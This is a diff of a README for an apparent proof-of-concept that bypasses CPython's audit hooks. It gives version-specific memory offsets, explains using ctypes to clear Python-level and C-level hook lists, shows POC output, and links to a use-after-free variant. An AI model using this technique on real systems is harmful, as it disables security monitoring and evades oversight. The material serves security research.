@@ -16,21 +16,22 @@ Python 3.11.7 (main, Jan 29 2024, 16:03:57) [GCC 13.2.1 20230801] on linux
 
 ## Offsets
 ```python
-# Python audit hook -- under interpreter state
-python_offset_311 = 0xe00
-python_offset_312 = 0x41448
-
-# native audit hook -- under runtime state
-native_offset_311 = -0xe388
-native_offset_312 = -0x11df0
+# ONLY TESTED ON PYTHON 3.12 and 3.11
+# the offsets are from POC.py
+# offset for audit hook set by python and C
+if sys.version_info[:2] == (3, 12):
+    PTR_OFFSET = [0x41448, -0x11df0]
+else:
+    PTR_OFFSET = [0xe00, -0xe388]
 ```
 
-## audit hook in Python
+## Smash Audit hook using `ctypes`
 ### Concept
-According to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `audit_hooks` pointer under `PyInterpreterState`, we can cast `audit_hook` to `Py_ListObject` by address and pop it.
-
+For audit hook set in Python: according to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `GET_INTERP_ADDR()->audit_hooks` pointer under `PyInterpreterState`, we can cast `audit_hook` to `Py_ListObject` by address and pop it.  
+For audit hook set in C: according to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `_PyRuntime.audit_hooks.head` pointer under `PyRuntimeState`, we can directly rewrite the head of audit hooks to `NULL`.
 ### How to use
 ```bash
+# or ./build311.sh
 ./build.sh
 ./POC.py
 ./POC2.py
@@ -39,55 +40,32 @@ According to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` an
 ### Output
 ```bash
 > ./POC.py
-PyInterpreterState_addr=0x5c50c812fbe8
-PyRuntimeState_addr=0x5c50c811d180
-PyInterpreterState.audit_hooks_ptr_addr=0x5c50c8170fb0
-PyRuntimeState.audit_hooks_ptr_addr=0x5c50c811dd78
+C audit hook triggered! event=sys.addaudithook
+--- finished setup ---
+PyInterpreterState_addr=0x64df082debe8
+PyRuntimeState_addr=0x64df082cc180
+PyInterpreterState.audit_hooks_ptr_addr=0x64df0831ffb0
+PyRuntimeState.audit_hooks_ptr_addr=0x64df082ccd78
 
-audit_hook_ptr_offset=0x41448
-1
-audit hook triggered!
+audit_hook_ptr_offset_by_py=0x41448
+audit_hook_ptr_offset_by_c=-0x11df0
+len=1 should be 1
+C audit hook triggered! event=os.system
+audit hook triggered! ('os.system', (b"echo 'test audit hook -- this will trigger hook'",))
 test audit hook -- this will trigger hook
 test audit hook -- this will not
 > ./POC2.py
-audit hook triggered!
+audit hook triggered! ('sys.addaudithook', ())
+--- finished setup ---
+C audit hook triggered! event=os.system
+audit hook triggered! ('os.system', (b"echo 'test audit hook -- this will trigger hook'",))
 test audit hook -- this will trigger hook
 test audit hook -- this will not
+
 ```
 
-## audit hook in C
-### Concept
-According to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `audit_hooks` pointer under `PyRuntimeState`, we can directly rewrite the head of audit hooks linkList to `NULL`.
-
-### How to use
-```bash
-./build.sh
-./POC-native-hook.py
-./POC-native-hook2.py
-```
-### Output
-```bash
-> ./POC-native.py
-PyInterpreterState_addr=0x5c7801978be8
-PyRuntimeState_addr=0x5c7801966180
-PyInterpreterState.audit_hooks_ptr_addr=0x5c78019b9fb0
-PyRuntimeState.audit_hooks_ptr_addr=0x5c7801966d78
-
-audit_hook_ptr_offset=-0x11df0
-C audit hook triggered!
-test audit hook -- this will trigger hook
-test audit hook -- this will not
-> ./POC2-native.py
-C audit hook triggered!
-test audit hook -- this will trigger hook
-test audit hook -- this will not
-```
-
-## Use issues/91153 to do arbitrary read/write
-[UAF POC](./UAF-issue91153/README.md)
-
-## Without `ctypes`
-[NO-CTYPES POC](./NO-CTYPES/README.md)
+## Smash Audit hook without `ctypes`
+[UAF POC](./UAF-issue91153.md)
 
 ## TODO
 - [x] Use <https://github.com/python/cpython/issues/91153> to smash it without `ctypes`
